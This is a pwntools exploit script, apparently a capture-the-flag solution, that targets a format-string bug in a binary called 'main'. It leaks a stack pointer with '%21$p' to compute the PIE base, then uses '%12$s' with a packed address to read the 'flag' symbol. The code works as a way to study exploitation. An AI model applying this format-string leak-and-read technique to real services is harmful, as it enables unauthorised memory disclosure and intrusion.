#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("172.17.0.2", 5000)
        time.sleep(1)
        pid = process(["pidof", "main"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x13B4
brva 0x13FD
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def integer(fmt, val):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", fmt)
    io.sendlineafter(b": ", str(val).encode())
    leak = io.recvline()
    return int(leak.strip(), 16)

def string(fmt, str):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", fmt)
    io.sendlineafter(b": ", str)
   

def solve():

    main_addr = integer(b"%21$p", 0)
    exe.address = main_addr - exe.sym["main"]
    info("elf base: %#x", exe.address)

    string("%12$s", p64(exe.sym["flag"]))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

